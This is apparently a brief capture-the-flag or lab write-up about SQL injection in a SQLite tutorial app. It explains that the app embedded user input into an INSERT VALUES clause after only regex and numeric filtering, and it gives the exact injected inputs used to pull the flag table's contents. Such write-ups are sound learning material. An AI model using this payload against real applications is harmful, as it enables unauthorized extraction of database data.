LAB: Tutorial, SQLite3

Vuln Type: slqi

Trusted point: goal and title;
The application trusted that the users input could be safely embedded into a SQL VALUES clause after superficial filtering (regex + numeric checks), without enforcing structure or using parameterization.


METHOD
inputs: GOAL '-1'
        TITLE "Hello
               1,
               (SELECT flag FROM flag))--"
               
